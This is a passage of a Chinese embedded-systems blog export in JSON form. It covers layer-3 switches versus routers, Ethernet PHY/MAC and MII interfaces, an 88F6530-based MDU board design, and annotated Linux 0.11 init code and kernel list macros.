一、三层交换机与路由器的主要区别之所以有人搞不清三层交换机和路由器之间的区别，最根本就是三层交换机也具有”路由”功能，与传统路由器的路由功能总体上是一致的。虽然如此，三层交换机与路由器还是存在着相当大的本质区别的，下面分别予以介绍。 1. 主要功能不同 虽然三层交换机与路由器都具有路由功能，但我们不能因此而把它们等同起来，正如现在许多网络设备同时具备多种传统网络设备功能一样，就如现在有许多宽带路由器不仅具有路由功能，还提供了交换机端口、硬件防火墙功能，但不能把它与交换机或者防火墙等同起来一样。因为这些路由器的主要功能还是路由功能，其它功能只不过是其附加功能，其目的是使设备适用面更广、使其更加实用。这里的三层交换机也一样，它仍是交换机产品，只不过它是具备了一些基本的路由功能的交换机，它的主要功能仍是数据交换。也就是说它同时具备了数据交换和路由由发两种功能，但其主要功能还是数据交换；而路由器仅具有路由转发这一种主要功能。 2. 主要适用的环境不一样三层交换机的路由功能通常比较简单，因为它所面对的主要是简单的局域网连接。正因如此，三层交换机的路由功能通常比较简单，路由路径远没有路由器那么复杂。它用在局域网中的主要用途还是提供快速数据交换功能，满足局域网数据交换频繁的应用特点。而路由器则不同，它的设计初哀就是为了满足不同类型的网络连接，虽然也适用于局域网之间的连接，但它的路由功能更多的体现在不同类型网络之间的互联上，如局域网与广域网之间的连接、不同协议的网络之间的连接等，所以路由器主要是用于不同类型的网络之间。它最主要的功能就是路由转发，解决好各种复杂路由路径网络的连接就是它的最终目的，所以路由器的路由功能通常非常强大，不仅适用于同种协议的局域网间，更适用于不同协议的局域网与广域网间。它的优势在于选择最佳路由、负荷分担、链路备份及和其他网络进行路由信息的交换等等路由器所具有功能。 3. 性能体现不一样 从技术上讲，路由器和三层交换机在数据包交换操作上存在着明显区别。路由器一般由基于微处理器的软件路由引擎执行数据包交换，而三层交换机通过硬件执行数据包交换。三层交换机在对第一个数据流进行路由后，它将会产生一个MAC地址与IP地址的映射表，当同样的数据流再次通过时，将根据此表直接从二层通过而不是再次路由，从而消除了路由器进行路由选择而造成网络的延迟，提高了数据包转发的效率。同时，三层交换机的路由查找是针对数据流的，它利用缓存技术，很容易利用ASIC技术来实现，因此，可以大大节约成本，并实现快速转发。而路由器的转发采用最长匹配的方式，实现复杂，通常使用软件来实现，转发效率较低。正因如此，从整体性能上比较的话，三层交换机的性能要远优于路由器，非常适用于数据交换频繁的局域网中；而路由器虽然路由功能非常强大，但它的数据包转发效率远低于三层交换机，更适合于数据交换不是很频繁的不同类型网络的互联，如局域网与互联网的互联。如果把路由器，特别是高档路由器用于局域网中，则在相当大程度上是一种浪费（就其强大的路由功能而言），而且还不能很好地满足局域网通信性能需求，影响子网间的正常通信。综上所述，三层交换机与路由器之间还是存在着非常大的本质区别的。无论从哪方面来说，在局域网中进行多子网连接，最好还选用三层交换机，特别是在不同子网数据交换频繁的环境中。一方面可以确保子网间的通信性能需求，另一方面省去了另外购买交换机的投资。当然，如果子网间的通信不是很频繁，采用路由器也无可厚非，也可达到子网安全隔离相互通信的目的。具体要根据实际需求来定 三层交换机的最重要的目的是加快大型局域网内部的数据交换，所具有的路由功能也是为这目的服务的，能够做到一次路由，多次转发。对于数据包转发等规律性的过程由硬件高速实现，而像路由信息更新、路由表维护、路由计算、路由确定等功能，由软件实现。 出于安全和管理方便的考虑，主要是为了减小广播风暴的危害，必须把大型局域网按功能或地域等因素化成一个个小的局域网，这就使得VLAN技术在网络中得到大量应用，而不同VLAN之间的通信都要经过路由器来完成转发，随着网间互访的不断增加。单纯使用路由器来实现网间访问，不但由于端口数量有限，而且路由速度较慢。从而限制了网络的规模和访问速度。基于这种情况三层交换机便应用而生。三层交换机是为IP设计的，接口类型简单；拥有很强二层包处理能力，非常适合用于大型局域网内的数据路由与交换，它既可以工作在协议第三层替代或是部分完成传统路由器的功能，同时又具有几乎第二层交换的速度，且价格相对便宜。 三层交换机出现最重要的目的是加快大型局域网内部的数据交换，所具有的路由功能也多是围绕这个目的而展开的，所以它的路由功能没有同一档次的专业路由器强。毕竟在安全、协议支持等方面还有许多欠缺，并不能完全取代路由器的工作。 在实际中的典型用法是：处于同一个局域网中的各个子网的互联以及局域网中VLAN间的路由，用三层交换机来代替路由。而只有局域网与公网互联之间要实现跨地域的网络访问，才通过专业路由器。 从表面上看，第三层交换机是第二层交换器与路由器的合二为一，然而这种结合并非简单的物理结合，而是各取所长的逻辑结合。其重要表现是，当某一信息源的第一个数据流进行第三层交换后，其中的路由系统会产生一个MAC地址与IP地址的映射表，并将该表存储起来，当同一信息源的后续数据流再次进入交换环境时，交换机将根据第一次产生并保存的地址映射表，直接从第二层由源地址传输到目的地址，不再经过第三路由系统处理，从而消除路由选择的网络延迟。","categories":[{"name":"arm","slug":"arm","permalink":"http://demonelf.github.io/categories/arm/"},{"name":"EMBEDDED","slug":"arm/EMBEDDED","permalink":"http://demonelf.github.io/categories/arm/EMBEDDED/"}],"tags":[]},{"title":"以太网PHY和MAC","slug":"EMBEDDED/以太网PHY和MAC","date":"2016-06-23T11:30:02.000Z","updated":"2017-07-10T08:46:28.403Z","comments":true,"path":"EMBEDDED/以太网PHY和MAC.html","link":"","permalink":"http://demonelf.github.io/EMBEDDED/以太网PHY和MAC.html","excerpt":"以太网PHY和MAC对应OSI模型的两个层——物理层和数据链路层。 物理层定义了数据传送与接收所需要的电与光信号、线路状态、时钟基准、数据编码和电路等，并向数据链路层设备提供标准接口（RGMII / GMII / MII）。 数据链路层则提供寻址机","text":"以太网PHY和MAC对应OSI模型的两个层——物理层和数据链路层。 物理层定义了数据传送与接收所需要的电与光信号、线路状态、时钟基准、数据编码和电路等，并向数据链路层设备提供标准接口（RGMII / GMII / MII）。 数据链路层则提供寻址机构、数据帧的构建、数据差错检查、传送控制、向网络层提供标准的数据接口等功能。 问：以太网PHY是什么？ 答：PHY是物理接口收发器，它实现物理层。IEEE-802.3标准定义了以太网PHY。它符合IEEE-802.3k中用于10BaseT(第14条)和100BaseTX(第24条和第25条)的规范。 问：以太网MAC是什么？ 答：MAC就是媒体接入控制器。以太网MAC由IEEE-802.3以太网标准定义。它实现了一个数据链路层。最新的MAC同时支持10/100/1000Mbps速率。通常情况下，它实现MII/GMII/RGMII接口，来同行业标准PHY器件实现接口。 问：什么是MII？ 答：MII（Medium Independent Interface）即媒体独立接口。它是IEEE-802.3定义的以太网行业标准。它包括一个数据接口，以及一个MAC和PHY之间的管理接口。数据接口包括分别用于发送器和接收器的两条独立信道。每条信道都有自己的数据、时钟和控制信号。MII数据接口总共需要16个信号。管理接口是个双信号接口：一个是时钟信号，另一个是数据信号。通过管理接口，上层能监视和控制PHY。 MII标准接口 用于连快Fast Ethernet MAC-block与PHY。”介质无关”表明在不对MAC硬件重新设计或替换的情况下，任何类型的PHY设备都可以正常工作。在其他速率下工作的与 MII等效的接口有：AUI（10M 以太网）、GMII（Gigabit 以太网）和XAUI（10-Gigabit 以太网）。 此外还有RMII(Reduced MII)、GMII(Gigabit MII)、RGMII（Reduced GMII）SMII等。所有的这些接口都从MII而来，MII是(Medium Independent Interface）的意思，是指不用考虑媒体是铜轴、光纤、电缆等，因为这些媒体处理的相关工作都有PHY或者叫做MAC的芯片完成。 MII支持10兆和100兆的操作，一个接口由14根线组成，它的支持还是比较灵活的，但是有一个缺点是因为它一个端口用的信号线太多，如果一个8端口的交换机要用到112根线，16端口就要用到224根线，到 32端口的话就要用到448根线，一般按照这个接口做交换机，是不太现实的，所以现代的交换机的制作都会用到其它的一些从MII简化出来的标准，比如 RMII、SMII、GMII等。 RMII是简化的MII接口，在数据的收发上它比MII接口少了一倍的信号线，所以它一般要求是50兆的总线时钟。RMII一般用在多端口的交换机，它不是每个端口安排收、发两个时钟，而是所有的数据端口公用一个时钟用于所有端口的收发，这里就节省了不少的端口数目。RMII的一个端口要求7个数据线，比MII少了一倍，所以交换机能够接入多一倍数据的端口。和 MII一样，RMII支持10兆和100兆的总线接口速度。 SMII是由思科提出的一种媒体接口，它有比RMII更少的信号线数目，S表示串行的意思。因为它只用一根信号线传送发送数据，一根信号线传输接受数据，所以在时钟上为了满足100的需求，它的时钟频率很高，达到了125兆，为什么用125兆，是因为数据线里面会传送一些控制信息。SMII一个端口仅用4根信号线完成100信号的传输，比起RMII差不多又少了一倍的信号线。SMII在工业界的支持力度是很高的。同理，所有端口的数据收发都公用同一个外部的125M时钟。 GMII是千兆网的MII接口，这个也有相应的RGMII接口，表示简化了的GMII接口。 MII总线 在IEEE802.3中规定的MII总线是一种用于将不同类型的PHY与相同网络控制器（MAC）相连接的通用总线。网络控制器可以用同样的硬件接口与任何PHY 。 GMII (Gigabit MII) ** GMII采用8位接口数据，工作时钟125MHz，因此传输速率可达1000Mbps。同时兼容MII所规定的10/100 Mbps工作方式。 GMII接口数据结构符合IEEE以太网标准。该接口定义见IEEE 802.3-2000。 发送器： ◇ GTXCLK——吉比特TX..信号的时钟信号（125MHz） ◇ TXCLK——10/100M信号时钟 ◇ TXD[7..0]——被发送数据 ◇ TXEN——发送器使能信号 ◇ TXER——发送器错误（用于破坏一个数据包） 注：在千兆速率下，向PHY提供GTXCLK信号，TXD、TXEN、TXER信号与此时钟信号同步。否则，在10/100M速率下，PHY提供TXCLK时钟信号，其它信号与此信号同步。其工作频率为25MHz（100M网络）或2.5MHz（10M网络）。 接收器： ◇ RXCLK——接收时钟信号（从收到的数据中提取，因此与GTXCLK无关联） ◇ RXD[7..0]——接收数据 ◇ RXDV——接收数据有效指示 ◇ RXER——接收数据出错指示 ◇ COL——冲突检测（仅用于半双工状态） 管理配置 **◇ MDC——配置接口时钟 ◇ MDIO——配置接口I/O 管理配置接口控制PHY的特性。该接口有32个寄存器地址，每个地址16位。其中前16个已经在”IEEE 802.3,2000-22.2.4 Management Functions”中规定了用途，其余的则由各器件自己指定。 RMII: Reduced Media Independant Interface 简化媒体独立接口 是标准的以太网接口之一，比MII有更少的I/O传输。 关于RMII口和MII口的问题 RMII口是用两根线来传输数据的， MII口是用4根线来传输数据的， GMII是用8根线来传输数据的。 MII/RMII只是一种接口，对于10M线速,MII的速率是2.5M，RMII则是5M；对于100M线速，MII的速率是25M，RMII则是50M。 MII/RMII用于传输以太网包，在MII/RMII接口是4/2bit的，在以太网的PHY里需要做串并转换、编解码等才能在双绞线和光纤上进行传 输，其帧格式遵循IEEE 802.3(10M)/IEEE 802.3u(100M)/IEEE 802.1q(VLAN)。 以太网帧的格式为：前导符+开始位+目的mac地址+源mac地址+类型/长度+数据+padding(optional)+32bitCRC 如果有vlan，则要在类型/长度后面加上2个字节的vlan tag，其中12bit来表示vlan id，另外4bit表示数据的优先级！ 吉比特以太网物理层协议及接口 吉比特以太网协议的数据链路层与传统的10/100Mb/s以太网协议相同，但物理层有所不同。三种协议与OSI七层模型的对应关系如图所示。 从图可以看出，吉比特以太网协议与10/100Mb /s以太网协议的差别仅仅在于物理层。图中的PHY表示实现物理层协议的芯片；协调子层（Reconciliation sublayer）用于实现指令转换；MII（介质无关接口）／GMII（吉比特介质无关接口）是物理层芯片与实现上层协议的芯片的接口；MDI（介质相关接口）是物理层芯片与物理介质的接口；PCS、PMA和PMD则分别表示实现物理层协议的各子层。在实际应用系统中，这些子层的操作细节将全部由PHY 芯片实现，只需对MII和MDI接口进行设计与操作即可。 吉比特以太网的物理层接口标准主要有四种：GMII、 RGMII（Reduced GMII）、TBI（Ten-Bit Interface）和RTBI（Reduced TBI）。GMII是标准的吉比特以太网接口，它位于MAC层与物理层之间。对于TBI接口，图1中PCS子层的功能将由MAC层芯片实现，在降低PHY 芯片复杂度的同时，控制线也比GMII接口少。RGMII和RTBI两种接口使每根数据线上的传输速率加倍，数据线数目减半。 网卡 PHY和MAC是网卡的主要组成部分，网卡一般用 RJ-45插口，10M网卡的RJ-45插口也只用了1、2、3、6四根针，而100M或1000M网卡的则是八根针都是全的。除此以外，还需要其它元件，因为虽然PHY提供绝大多数模拟支持，但在一个典型实现中，仍需外接6、7只分立元件及一个局域网绝缘模块。绝缘模块一般采用一个1：1的变压器。这些部件的主要功能是为了保护PHY免遭由于电气失误而引起的损坏。 网卡的功能主要有两个:一是将电脑的数据封装为帧，并通过网线(对无线网络来说就是电磁波)将数据发送到网络上去;二是接收网络上其它设备传过来的帧，并将帧重新组合成数据，发送到所在的电脑中。网卡能接收所有在网络上传输的信号，但正常情况下只接受发送到该电脑的帧和广播帧，将其余的帧丢弃。然后，传送到系统CPU做进一步处理。当电脑发送数据时，网卡等待合适的时间将分组插入到数据流中。接收系统通知电脑消息是否完整地到达，如果出现问题，将要求对方重新发送。","categories":[{"name":"arm","slug":"arm","permalink":"http://demonelf.github.io/categories/arm/"},{"name":"EMBEDDED","slug":"arm/EMBEDDED","permalink":"http://demonelf.github.io/categories/arm/EMBEDDED/"}],"tags":[]},{"title":"基于88F6530的MDU主控系统的设计","slug":"EMBEDDED/基于88F6530的MDU主控系统的设计","date":"2016-06-22T07:05:08.000Z","updated":"2017-07-10T08:46:38.766Z","comments":true,"path":"EMBEDDED/基于88F6530的MDU主控系统的设计.html","link":"","permalink":"http://demonelf.github.io/EMBEDDED/基于88F6530的MDU主控系统的设计.html","excerpt":"摘 要： 多用户接入单元（Multiple Dwelling Unit，[MDU）是FTTB中的核心设备。随着人们对宽带速率增长的需求，传统的DSL网络已经无法满足人们对带宽的需求，光纤接入FTTH(光纤到户)、FTTB(光纤到楼)带宽大、扩展性好，可以满","text":"摘 要： 多用户接入单元（Multiple Dwelling Unit，[MDU）是FTTB中的核心设备。随着人们对宽带速率增长的需求，传统的DSL网络已经无法满足人们对带宽的需求，光纤接入FTTH(光纤到户)、FTTB(光纤到楼)带宽大、扩展性好，可以满足用户现在及未来对带宽的需求。然而FTTH(光纤到户)业务的部署成本太高,无法利用电信网络目前存在的铜线资源。FTTB(光纤到楼)+Lan或FTTB+DSL不仅可以满足用户的带宽需求，同时又可以利用现有铜线资源，降低部署成本。本文研究的MDU就是FTTB的核心设备。本文主要研究了MDU设备主控系统的硬件实现。 关键词： MDU；主控板](http://www.chinaaet.com/tags/MDU “MDU”)；GPON；EPON 0 引言 MDU 在网络中的位置如图1所示，它是最靠近用户端的设备，对用户可以提供VDSL 、ADSL 、FE 和语音POTS接入。可以上连GPON、EPON、10GEPON、 XGGPON或者GE(Optical and Electric)。 1 MDU主控系统架构 根据要求和应用场景不同，MDU 有1U 和2U两种。2U 通常是有主控板、一个上连卡、背板和4个槽位的LT 板。1U有一个主控板、一个上连卡和一个LT板，通过背板将这几个部分连接在一起。本系统是基于1U 的设计，将上连和主控部分集成在一块板卡上，通过一个芯片88F6530来实现。主控板的系统实现框图如图2所示。 在此设计中88F6530做为主控芯片，上行可以是GPON也可以是EPON ,通过88F6530一个芯片实现，不需要硬件设计的改变，只需改变软件即可实现，节省了开发周期。用户接口有24FE和32POTS两种。88F6530内部集成了一个语音处理DSP核，外部不需要语音处理芯片DSP,节省了成本。POTS用户板的TDM 信号直接与88F6530的TDM 接口连接。POTS用户板的管理接口由88F6530的HPI 接口通过CPLD 来控制。24FE 接口由Marvell 的Poncat 芯片98DX1135来实现。98DX1135有3组S3MII接口，通过外接PHY可以实现 24FE ,其中8个FE 由主板实现，另外16FE 由LT 来实现。 从图2可以看出主控系统可以分为4部分： ⑴主控芯片88F6530 及其外围包括DDR、Flash和RI 温度传感器； ⑵上行接口EPON 或者GPON； ⑶用户接口POTS、FE 接口及其控制接口； ⑷电源部分。 下面分别对这几个部分详细论述其具体实现。 2 主控芯片88F6530及其外围 2.1 主控芯片88F6530 88F6530是Marvell AVAVTA 系列产品中的一款，主要应用在MDU产品中。88F6530 MDU ONU设备提供Universal PON(UPON) MAC ,兼容EPON 和GPON，基于IPV6和IPV4包处理器线速可达到2.5 Gb/s，还有32通道的语音引擎。由于其具有高集成度、低功耗、高性能的特点，88F6530为运营商提供了一种低成本部署光纤宽带的选择，可以为用户提供视频、界面和云等体验。88F6530具有以下特点： ⑴ 完全兼容EPON、GPON和P2P以太网MAC； ⑵2.5 G 的Switch接口； ⑶VoIP和控制处理器：1.6 GHz的CPU，有16 KB的一级Caches和256 KB的二级Caches； ⑷32通道的VoIP DSP 支持G.729和G.723； ⑸TDM接口支持标准的SLIC/SLAC设备； ⑹支持 DDR2/DDR3设备，DDR2支持400 MHz，DDR3支持533 MHz，集成了4个DRAM片选； ⑺支持NAND、NOR 和SPI Flash； ⑻两个PCIe接口； ⑼I2C 接口； ⑽中断处理器； ⑾两个UART接口。 88F6530内部结构如图3所示。 通过以上特性的介绍和88F6530内部结构可以看出，88F6530可以作为此系统的主控芯片完成大部分功能，同时可以节省开发成本。 2.2 88F6530外围电路 2.2.1 DDR和Flash 88F6530支持16 bit的DDR2接口和DDR3接口， 本系统采用了1 G的16 bit DDR2 (HY5PS1G163)。DDR2最大频率可达到400 MHz。同时使用了512 MB的NAND Flash(NAND04GW3B2DN6E)和128 MB的SPI Flash(M25P128)。SPI Flash是启动时Boot所用的，NAND Flash为存取数据所用。 2.2.2 系统时钟 本系统采用25 MHz的外部时钟作为系统时钟，为内部PLL 提供参考时钟。 2.2.3 I2C设备 RI和温感 88F6530只有一组I2C接口，无法满足本系统的要求。在本系统中有RI和温度传感器，还有检测LT子卡的I2C接口，因此至少需要3个I2C接口。I2C Switch 芯片PCA9544A 有4组I2C接口，可以满足本设计的需求，一组为RI,一组为温感，另外一组通往背板供LT使用。8k×8bit的E2PROM作为RI 设备。TI的TMP432作为检测温度。此温感芯片是一个可远端监测温度和本地监测温度的传感器。远端温度检测可以通过外接一个NPN或者PNP三极管来实现。在此系统中将一路远端用于检测电源部分的温度，另外一个远端用于检测PONCAT 98DX1135，TMP432芯片本身来检测主控芯片88F6530的温度。根据系统预设的初始值，在外界温度超过此值时芯片会告警。 3 上行接口EPON GPON 88F6530 内部集成了EPON 、GPON MAC，外围只需接相应的芯片就可以实现GPON或EPON上连。此系统中外部使用了MAX3840，它是一款双路2×2异步矩阵开关，宽带频、全差分信号通路使累积抖动、串扰即信号偏斜最小。每路2×2矩阵开关能够扇出或复用高达2.7 Gb/s的数据和2.7 GHz时钟信号。 4 用户接口 FE 和POTS接口 4.1 FE接口 在此系统中FE接口是使用Marvell的PonCat 98DX1135来实现的。 4.1.1 PonCat 98DX1135 PonCat 98DX1135 是FE Switch PonCat2系列产品中新一代高集成、经济有效的一款芯片。此芯片是Marvell Prestera- DX系列中一款高性能、低功耗的处理器，是一款比较理想的芯片。PonCat系列产品增强了封装散热，超成本优化设计支持最小PCB 布线要求，可以无风扇设计。此款芯片的上行SerDes端口可以支持10/100/1000/2500 的SGMII和1000Base-x,与Marvell外接GPON MAC具有相同的功能。Poncat内部也有CPU，因为此系统以88F6530做为主控芯片，因此这里不使能Poncat内部的CPU。 4.1.2 24FE 的实现 98DX1135 内部有FE MAC，外部只需FE PHY 就可以实现用户的FE接口要求。在本系统中8个FE是由主控板来实现，其余16个FE由LT来实现。主控板将两组S3MII信号连接到背板。在主控板上使用Marvell的PHY 88E3083与98DX1135的S3MII接口相连。88E3083是Marvell为快速以太网设计的第三代基于DSP 的八端口物理层设备。此芯片可以完成MACs和物理媒体的数据转换。88E3083支持1EEE802.3，支持使用双绞线的100BASE-TX 和10BASE-T网络全双工或者半双工的自动协商机制，具有S3MII接口，可以很好地与98DX1135直连，不需要其他转换芯片。对88E3083的控制通过MDIO接口来实现。 4.2 POTS接口 因为88F6530内部集成了32通道的语音处理器，所以在本系统中不需要外接DSP芯片来完成语音信号处理。88F6530 的TDM信号可以直接和SLAC连接。此接口可以作为Master模式提供帧同步信号和时钟信号， 或者也可以作为Slave模式，接收帧同步信号和时钟信号；线性编码支持u率和A率；时钟范围256 kHz ~ 8.192 MHz；此部分提供一个SPI接口，本系统是32POTS，因此有4个SLAC，需要4个CS，为了实现对SLAC的控制和配置，将SPI接口通过CPLD来实现对4个SLAC的控制。在主控系统中，只需提供DX、DR、FS、CLK 和四组SPI信号到背板就可以实现与POTS子板的连接和通信。 5 电源设计 PONCAT 98DX1135需要核电压1.0 V，SDRAM 1.8 V，其余 3.3 V。而88F6530需要核电压1.0 V，CPU 1.1 V、1.5 V、2.5 V还有 3.3 V，因此整个系统需要电压种类多，共需要5种电源，其中3.3 V、1.0 V、1.5 V所需要的电流比较大，用DC-DC来实现转换。此板输入电压为12 V，12 V进入之后先进行滤波，然后经过热拔插保护芯片LTC4210，由LTC4210输出的12 V电压再进行转换，转换为板上所需的3.3 V、2.5 V、1.8 V、1.5 V、1.1 V、1.0 V。LTC4210还可以监测 输入电压12 V，若12 V的抖动超过了系统所允许的范围，则会自动关断12 V。此系统所用的3.3 V 芯片为TI的TPS54550。TPS54550是TI公司的一款DC-DC，输入电压4.5 V~20 V，输出电流可以达到6 A，具有可调节的开关频率。 1.0 V、1.5 V由ADP1829来实现。ADP1829是AD公司的一款双路DC-DC芯片。此芯片开关频率可以工作在300 kHz、600 kHz,有软启动功能、热过载保护及电流过载保护等功能。其余电压用LDO 来实现。系统中所需的电压种类比较多，而且各个电压之间上电和下电之间的时序有一定的要求，只有满足了这些要求，系统才可以正常工作。这些通常可以通过调整电源芯片EN管脚上的电阻、电容来实现。 6 结束语 本文从各个部分详细地论述了MDU主控板的硬件设计，此设计最大的优点就是主控芯片集成了EPON和GPON MACs，节省了开发的硬件和软件成本，同时又满足了用户的需求。 参考文献 [1] Marvell. 88F6530 hardware specifications[Z]. 2010. [2] Marvell. Prestera PonCat2-FE hardware specificaions[Z]. 2010. [3] Marvell. 88E3083 integrated 8 Port 10/100 fast ethernet transceiver[Z]. 2002. [4] Maxim Integraled Products. Max3840 Dual 2X2 Crosspoint Switch(Rev 5)[Z]. 2007. [5] Texas Instruments Incorporaterd. Tps54550 datasheet[Z]. 2006.","categories":[{"name":"arm","slug":"arm","permalink":"http://demonelf.github.io/categories/arm/"},{"name":"EMBEDDED","slug":"arm/EMBEDDED","permalink":"http://demonelf.github.io/categories/arm/EMBEDDED/"}],"tags":[]},{"title":"二层交换机和三层交换机有什么区别？","slug":"EMBEDDED/二层交换机和三层交换机有什么区别？","date":"2016-06-21T14:12:56.000Z","updated":"2017-07-10T08:46:11.755Z","comments":true,"path":"EMBEDDED/二层交换机和三层交换机有什么区别？.html","link":"","permalink":"http://demonelf.github.io/EMBEDDED/二层交换机和三层交换机有什么区别？.html","excerpt":"二层交换机工作于OSI模型的第2层(数据链路层)，故而称为二层交换机。二层交换技术是发展比较成熟，二层交换机属数据链路层设备，可以识别数据包中的MAC地址信息，根据MAC地址进行转发，并将这些MAC地址与对应的端口记录在自己内部的一个地址表中。 三层交","text":"二层交换机工作于OSI模型的第2层(数据链路层)，故而称为二层交换机。二层交换技术是发展比较成熟，二层交换机属数据链路层设备，可以识别数据包中的MAC地址信息，根据MAC地址进行转发，并将这些MAC地址与对应的端口记录在自己内部的一个地址表中。 三层交换机就是具有部分路由器功能的交换机，三层交换机的最重要目的是加快大型局域网内部的数据交换，所具有的路由功能也是为这目的服务的，能够做到一次路由，多次转发。对于数据包转发等规律性的过程由硬件高速实现，而像路由信息更新、路由表维护、路由计算、路由确定等功能，由软件实现。三层交换技术就是二层交换技术+三层转发技术。 传统交换技术是在OSI网络标准模型第二层–数据链路层进行操作的，而三层交换技术是在网络模型中的第三层实现了数据包的高速转发，既可实现网络路由功能，又可根据不同网络状况做到最优网络性能。","categories":[{"name":"arm","slug":"arm","permalink":"http://demonelf.github.io/categories/arm/"},{"name":"EMBEDDED","slug":"arm/EMBEDDED","permalink":"http://demonelf.github.io/categories/arm/EMBEDDED/"}],"tags":[]},{"title":"Linux内核完全注释笔记","slug":"EMBEDDED/Linux内核完全注释笔记","date":"2016-06-21T06:33:55.000Z","updated":"2017-07-10T08:53:06.520Z","comments":true,"path":"EMBEDDED/Linux内核完全注释笔记.html","link":"","permalink":"http://demonelf.github.io/EMBEDDED/Linux内核完全注释笔记.html","excerpt":"1. # 概述 1. # 微型计算机组成结构 2. # 内核编程语言和环境 3. # 80X86保护模式及其","text":"# 概述 # 微型计算机组成结构 # 内核编程语言和环境 # 80X86保护模式及其编程 # Linux内核体系结构 # 引导启动程序(boot) # 初始化程序(init) / 内核初始化主程序。初始化结束后将以任务0 (idle任务即空闲任务)的身份运行。 / void main(void) / This really IS void, no error here. / { / The startup routine assumes (well, …) this / /* 这里确实是void，并没错。在startup 程序(head.s)中就是这样假设的。 参见head.s 程序第136 行开始的几行代码。 / trap_init (); / 陷阱门（硬件中断向量）初始化。（kernel/traps.c，181 行） / tty_init (); / tty 初始化。（kernel/chr_dev/tty_io.c，105 行） / sched_init (); / 调度程序初始化(加载了任务0 的tr, ldtr) （kernel/sched.c，385） / buffer_init (buffer_memory_end);/ 缓冲管理初始化，建内存链表等。（fs/buffer.c，348） / sti (); / 所有初始化工作都做完了，开启中断。 / / 下面过程通过在堆栈中设置的参数，利用中断返回指令切换到任务0。 / move_to_user_mode (); / 移到用户模式。（include/asm/system.h，第1 行） / if (!fork()) { / we count on this going ok / init(); } /* * NOTE!! For any other task ‘pause()’ would mean we have to get a * signal to awaken, but task0 is the sole exception (see ‘schedule()’) * as task 0 gets activated at every idle moment (when no other tasks * can run). For task0 ‘pause()’ just means we go check if some other * task can run, and if not we return here. */ /* 注意!! 对于任何其它的任务，‘pause()’将意味着我们必须等待收到一个信号才会返 * 回就绪运行态，但任务0（task0）是唯一的意外情况（参见‘schedule()’），因为任务0 在 * 任何空闲时间里都会被激活（当没有其它任务在运行时），因此对于任务0’pause()’仅意味着 * 我们返回来查看是否有其它任务可以运行，如果没有的话我们就回到这里，一直循环执行‘pause()’。 */ for(;;) pause(); } void init(void) { int pid,i; / 读取硬盘参数包括分区表信息并建立虚拟盘和安装根文件系统设备。 / / 该函数是在25 行上的宏定义的，对应函数是sys_setup()，在kernel/blk_drv/hd.c,71 行。 / setup((void *) &amp;drive_info); (void) open(“/dev/tty0”,O_RDWR,0); / 用读写访问方式打开设备“/dev/tty0”， / / 这里对应终端控制台。 / / 返回的句柄号0 – stdin 标准输入设备。 / (void) dup (0); / 复制句柄，产生句柄1 号 – stdout 标准输出设备。 / (void) dup (0); / 复制句柄，产生句柄2 号 – stderr 标准出错输出设备。 / printf(“%d buffers = %d bytes buffer space\\n\\r“,NR_BUFFERS,NR_BUFFERSBLOCK_SIZE); / 打印缓冲区块数和总字节数，每块1024 字节。 */ printf(“Free mem: %d bytes\\n\\r“,memory_end-main_memory_start); /空闲内存字节数。 / / 下面fork()用于创建一个子进程(子任务)。 / / 对于被创建的子进程，fork()将返回0 值， 对于原(父进程)将返回子进程的进程号。 / / 所以180-184 句是子进程执行的内容。 / / 该子进程关闭了句柄0(stdin)，以只读方式打开/etc/rc 文件，并执行/bin/sh 程序，所带参数和 / / 环境变量分别由argv_rc 和envp_rc 数组给出。参见后面的描述。 / if (!(pid=fork())) { close(0); if (open(“/etc/rc”,O_RDONLY,0)) _exit(1); / 如果打开文件失败，则退出(/lib/_exit.c,10)。 / execve(“/bin/sh”,argv_rc,envp_rc); / 装入/bin/sh 程序并执行。 / _exit(2); / 若execve()执行失败则退出(出错码2,”文件或目录不存在“)。 / } / 下面是父进程执行的语句。 / / wait()是等待子进程停止或终止，其返回值应是子进程的进程号(pid)。这三句的作用是父进程等待子进程的结束。 / / &amp;i 是存放返回状态信息的位置。 如果wait()返回值不等于子进程号，则继续等待。 / if (pid&gt;0) while (pid != wait(&amp;i)) / nothing /; /* 如果执行到这里，说明刚创建的子进程的执行已停止或终止了。下面循环中首先再创建一个子进程， * 如果出错，则显示“初始化程序创建子进程失败“的信息并继续执行。对于所创建的子进程关闭所有 * 以前还遗留的句柄(stdin, stdout, stderr)，新创建一个会话并设置进程组号，然后重新打开 * /dev/tty0 作为stdin，并复制成stdout 和stderr。 * 再次执行系统解释程序/bin/sh。但这次执行所选用的参数和环境数组另选了一套（见上面165-167 行）。 * 然后父进程再次运行wait()等待。如果子进程又停止了执行，则在标准输出上显示出错信息“子进程pid 停 * 止了运行，返回码是i”，然后继续重试下去…，形成“大“死循环。 */ while (1) { if ((pid=fork())&lt;0) { printf(“Fork failed in init\\r\\n“); continue; } if (!pid) { close(0);close(1);close(2); setsid(); (void) open(“/dev/tty0”,O_RDWR,0); (void) dup(0); (void) dup(0); _exit(execve(“/bin/sh”,argv,envp)); } while (1) if (pid == wait(&amp;i)) break; printf(“\\n\\rchild %d died with code %04x\\n\\r“,pid,i); sync(); } _exit(0); / NOTE! _exit, not exit() / } 。","categories":[{"name":"arm","slug":"arm","permalink":"http://demonelf.github.io/categories/arm/"},{"name":"EMBEDDED","slug":"arm/EMBEDDED","permalink":"http://demonelf.github.io/categories/arm/EMBEDDED/"}],"tags":[]},{"title":"Linux内核中链表的实现与应用","slug":"EMBEDDED/Linux内核中链表的实现与应用","date":"2016-06-21T00:56:56.000Z","updated":"2017-07-10T08:44:20.869Z","comments":true,"path":"EMBEDDED/Linux内核中链表的实现与应用.html","link":"","permalink":"http://demonelf.github.io/EMBEDDED/Linux内核中链表的实现与应用.html","excerpt":"链表（循环双向链表）是Linux内核中最简单、最常用的一种数据结构。 1、链表的定义 struct list_head { struct list_head next, prev; } 这个不含数据域的链表,可以嵌入到任何数据","text":"链表（循环双向链表）是Linux内核中最简单、最常用的一种数据结构。 1、链表的定义 struct list_head { struct list_head next, prev; } 这个不含数据域的链表,可以嵌入到任何数据结构中,例如可按如下方式定义含有数据域的链表： struct my_list { void * mydata; struct list_head list; } ; 2、链表的声明和初始化宏 struct list_head 只定义了链表结点,并没有专门定义链表头.那么一个链表结点是如何建立起来的？ 内核代码 list.h 中定义了两个宏： #defind LIST_HEAD_INIT(name) { &amp;(name), &amp;(name) } //仅初始化 #defind LIST_HEAD(name) struct list_head name = LIST_HEAD_INIT(name) //声明并初始化 